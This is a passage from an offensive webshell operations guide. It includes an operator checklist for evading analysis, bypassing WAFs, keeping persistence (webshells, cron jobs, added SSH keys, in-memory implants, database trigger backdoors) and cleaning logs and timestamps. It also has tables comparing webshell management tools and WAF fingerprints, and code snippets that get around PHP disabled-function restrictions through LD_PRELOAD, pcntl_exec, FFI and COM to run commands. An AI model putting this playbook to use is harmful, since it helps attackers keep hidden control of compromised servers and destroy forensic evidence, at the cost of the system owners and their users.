
[ ] Dynamic analysis evasion
    [ ] Password protection working
    [ ] User-Agent filtering active
    [ ] Time-based activation configured
    [ ] 404/403 response for unauthorized access
    [ ] Delay execution enabled

[ ] Traffic analysis evasion
    [ ] HTTPS enforced
    [ ] Traffic encrypted (AES/ChaCha20)
    [ ] Heartbeat disguised as normal traffic
    [ ] Request/response patterns mimic legitimate API
    [ ] Custom headers used

[ ] WAF bypass verification
    [ ] Chunked transfer works
    [ ] Compression bypass works
    [ ] HTTP/2 multiplexing works
    [ ] TLS fingerprint acceptable
    [ ] Content-Type manipulation works

[ ] Persistence verification
    [ ] Multiple WebShell locations
    [ ] Cron/scheduled task active
    [ ] SSH key added
    [ ] Memory horse deployed
    [ ] Database trigger backdoor

[ ] Cleanup
    [ ] Logs sanitized
    [ ] File timestamps restored
    [ ] Upload traces removed
    [ ] No suspicious processes
    [ ] Network connections appear normal
```

---

## 11. TOOL INTEGRATION REFERENCE

### 11.1 Common WebShell Management Tool Comparison

| Tool | Encryption | Protocol | Evasion Level | Language Support |
|---|---|---|---|---|
| AntSword (蚁剑) | Custom encoders | HTTP/HTTPS | Medium | PHP, ASP, ASPX, JSP, Custom |
| Behinder (冰蝎) | AES + DH key exchange | HTTP/HTTPS, WebSocket | High | PHP, ASP, ASPX, JSP, Java |
| Godzilla (哥斯拉) | AES + custom cipher | HTTP/HTTPS | Very High | PHP, ASP, ASPX, JSP, Java, C# |
| Weevely | Custom obfuscation | HTTP/HTTPS | Medium | PHP |
| QuasiBot | XOR + Base64 | HTTP/HTTPS | Low | PHP |

### 11.2 WAF Fingerprinting Quick Reference

| WAF | Header Signature | Behavior |
|---|---|---|
| Cloudflare | `cf-ray`, `cf-cache-status`, `__cfduid` | 403 with Cloudflare branded page |
| Alibaba Cloud WAF | `ali-cdn`, `x-cache`, `eagleeye-traceid` | 405 with Alibaba branded page |
| Tencent Cloud WAF | `x-cos-request-id`, `x-nws-log-uuid` | 403 with Tencent branded page |
| Imperva | `x-iinfo`, `x-cdn`, `x-request-id` | 403 with Imperva branded page |
| AWS WAF | `x-amzn-requestid`, `x-amz-cf-id` | 403 with AWS branded page |
| Akamai | `x-akamai-*`, `x-cache-key` | 403/redirect to block page |
| F5 BIG-IP | `X-WA-Info`, `X-Cnection` | 403 with BIG-IP cookie |
| ModSecurity | (varies, typically no brand) | 403/406 with generic error |
| Sucuri | `x-sucuri-id`, `x-sucuri-cache` | 403 with Sucuri branded page |

### 11.3 PHP Disabled Functions Bypass Reference

```
Common disabled functions and bypasses:

1. system, exec, passthru, shell_exec, popen, proc_open
   Bypass: Use `backticks`, pcntl_exec, mail() + LD_PRELOAD

2. mail() LD_PRELOAD bypass:
   putenv('LD_PRELOAD=/tmp/evil.so');
   mail('a','b','c','d');

3. pcntl_exec:
   pcntl_exec('/bin/sh', ['-c', $cmd]);

4. imap_open() RCE:
   imap_open('{localhost:993/imap/ssl}INBOX', '', '');

5. FFI (PHP 7.4+):
   $ffi = FFI::cdef('int system(const char *command);', 'libc.so.6');
   $ffi->system('id');

6. COM/.NET (Windows):
   $wsh = new COM('WScript.Shell');
   $wsh->Run('cmd.exe /c ' . $cmd, 0, false);

7. PHP CGI + Apache mod_cgi:
   Exploit cgi.force_redirect bypass

8. ImageMagick (via imagick extension):
   Use delegate vulns in ImageMagick policy
```

---

## 12. REFERENCES

- OWASP File Upload Cheat Sheet
- PHP Security: Disabled Functions and Bypasses
- Tomcat Memory Horse Research (LandGrey, 2020)
- Behinder Protocol Analysis (4.0+)
- Godzilla Protocol Analysis (3.0+)
- AntSword Encoder Development Guide
- HTTP/2 Request Smuggling (James Kettle, PortSwigger)
- Cloudflare WAF Bypass Techniques (2024-2026)
- WAF Bypass via Transfer-Encoding Chunked
- JA3/JA4 TLS Fingerprinting
- Container Escape Techniques (Kubernetes)
- Cloud Metadata Service Exploitation